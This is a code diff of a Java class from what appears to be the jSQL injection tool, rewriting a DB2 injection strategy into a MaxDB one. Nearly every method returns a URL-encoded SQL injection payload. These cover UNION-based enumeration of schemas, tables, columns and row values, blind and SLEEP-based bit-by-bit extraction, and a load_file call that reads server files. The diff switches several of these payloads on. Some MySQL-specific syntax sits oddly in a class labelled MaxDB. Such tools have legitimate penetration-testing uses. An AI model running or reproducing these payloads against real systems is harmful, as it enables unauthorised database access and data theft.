@@ -10,56 +10,59 @@ import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
-public class DB2Strategy implements ISQLStrategy {
+public class MaxDbStrategy implements ISQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
-            "select+hex(versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user)||'i'from+sysibm.sysversions";
+        return
+            "SELECT+replace(hex('MaxDB+(SAP+DB)+'||id||'{%}'||DATABASE()||'{%}'||user()||'{%}'||'%3F'),'00','')||'i'r+from+sysinfo.VERSION";
     }
 
     @Override
     public String getSchemaList() {
         return
-            /**
-             * First substr(,3) remove 'gg' at the beginning
-             */
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(schemaname))||'jj30hh'))as+varchar(1024)),3)||'i'from+syscat.schemata{limit}";
+            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.schemaname)),'00','')||'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+schemaname+from+SCHEMAS)t,(select+distinct+schemaname+from+SCHEMAS)t1+" +
+            "where+t.schemaname>=t1.schemaname+" +
+            "group+by+t.schemaname{limit})a,(select+count(distinct+schemaname)nb+from+SCHEMAS)y";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-            /**
-             * First substr(,3) remove 'gg' at the beginning
-             */
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+name+from+sysibm.systables+where+creator='"+database+"'{limit})x";
+            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.tablename)),'00','')||'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t,(select+distinct+tablename+from+TABLES+where+SCHEMANAME='" + database + "')t1+" +
+            "where+t.tablename>=t1.tablename+" +
+            "group+by+t.tablename{limit})a,(select+count(distinct+tablename)nb+from+TABLES+where+SCHEMANAME='" + database + "')y";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+name+from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'+{limit})x";
+            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.COLUMNNAME)),'00','')||'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t,(select+distinct+COLUMNNAME+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')t1+" +
+            "where+t.COLUMNNAME>=t1.COLUMNNAME+" +
+            "group+by+t.COLUMNNAME{limit})a,(select+count(distinct+COLUMNNAME)nb+from+COLUMNS+where+SCHEMANAME='" + table.getParent() + "'and+TABLENAME='" + table + "')y";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
-        formatListColumn = formatListColumn.replace("{%}", "||''))||chr(127)||trim(varchar(");
-        formatListColumn = "trim(varchar(" + formatListColumn + "||''))";
+        // 7f caractère d'effacement, dernier code hexa supporté par mysql, donne 3f=>? à partir de 80
+        formatListColumn = formatListColumn.replace("{%}", "),''))||'%7F'||trim(ifnull(chr(");
+        formatListColumn = "trim(ifnull(chr(" + formatListColumn + "),''))";
         
         return
-            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||r||'jj30hh'))as+varchar(1024)),3)||'i'from+"
-            + "(select+hex(" + formatListColumn + ")r+from+" + database + "." + table + "+where+1=1+{limit})x";
+            "select+rr||'i'r+from(select+'hh'||replace(hex(trim(t.s)),'00','')||'jj30hh'rr,count(*)c+" +
+            "from(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t,(select+distinct+" + formatListColumn + "s+from+" + database + "." + table + ")t1+" +
+            "where+t.s>=t1.s+" +
+            "group+by+t.s{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+" + database + "." + table + ")y";
     }
 
     @Override
     public String getPrivilege() {
         return "";
-//        return 
 //            "concat(" +
 //                "(" +
 //                    "select+" +
@@ -77,14 +80,12 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String readTextFile(String filePath) {
-        return "";
-//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
+        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
     }
 
     @Override
     public String writeTextFile(String content, String filePath) {
-        return "";
-//        return 
+        return  "";
 //            MediatorModel.model().initialQuery
 //                .replaceAll(
 //                    "1337" + MediatorModel.model().visibleIndex + "7331",
@@ -106,50 +107,42 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String getBlindFirstTest() {
-        return "";
-//        return "0%2b1=1";
+        return "0%2b1=1";
     }
 
     @Override
     public String blindCheck(String check) {
-        return "";
-//        return "+and+" + check + "--+";
+        return "+and+" + check + "--+";
     }
 
     @Override
     public String blindBitTest(String inj, int indexCharacter, int bit) {
-        return "";
-//        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
+        return "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
     }
 
     @Override
     public String blindLengthTest(String inj, int indexCharacter) {
-        return "";
-//        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
+        return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
     }
 
     @Override
     public String timeCheck(String check) {
-        return "";
-//        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(" + check + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
     }
 
     @Override
     public String timeBitTest(String inj, int indexCharacter, int bit) {
-        return "";
-//        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
     }
 
     @Override
     public String timeLengthTest(String inj, int indexCharacter) {
-        return "";
-//        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
+        return "+and+if(char_length(" + inj + ")>" + indexCharacter + ",1,SLEEP(" + ConcreteTimeInjection.SLEEP + "))--+";
     }
 
     @Override
     public String blindStrategy(String sqlQuery, String startPosition) {
-        return "";
-//        return 
+        return  "";
 //            "(" +
 //                "select+" +
 //                "concat(" +
@@ -165,8 +158,7 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String getErrorBasedStrategyCheck() {
-        return "";
-//        return 
+        return  "";
 //            "+and(" +
 //                "select+1+" +
 //                "from(" +
@@ -182,8 +174,7 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String errorBasedStrategy(String sqlQuery, String startPosition) {
-        return "";
-//        return 
+        return  "";
 //            "+and" +
 //                "(" +
 //                "select+" +
@@ -208,21 +199,13 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return
-          "(select+" +
-              /**
-               * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
-               */
-              "replace('SQLi'||substr(" +
-                  "(" + sqlQuery + ")," +
-                  startPosition +
-              "),'SQLii','SQLi')+from+sysibm.sysdummy1)";
+        return 
+            "select+'SQLi'||SUBSTR(r," + startPosition + ",1500)from(" + sqlQuery + ")x";
     }
 
     @Override
     public String timeStrategy(String sqlQuery, String startPosition) {
         return "";
-//        return 
 //            "(" +
 //                "select+" +
 //                    "concat(" +
@@ -241,17 +224,19 @@ public class DB2Strategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
+                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
             );
     }
 
     @Override
     public String initialQuery(Integer nbFields) {
+        String replaceTag = "";
         List<String> fields = new ArrayList<String>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
-            fields.add("1337"+ i +"7330%2b1");
+            fields.add("*");
+            replaceTag = "select(1337"+ i +"7330%2b1)y+from+dual";
         }
-        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+sysibm.sysdummy1--+";
+        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")z+";
     }
 
     @Override
@@ -261,7 +246,6 @@ public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return "+limit+" + limitSQLResult + ",5";
+        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
-
 }
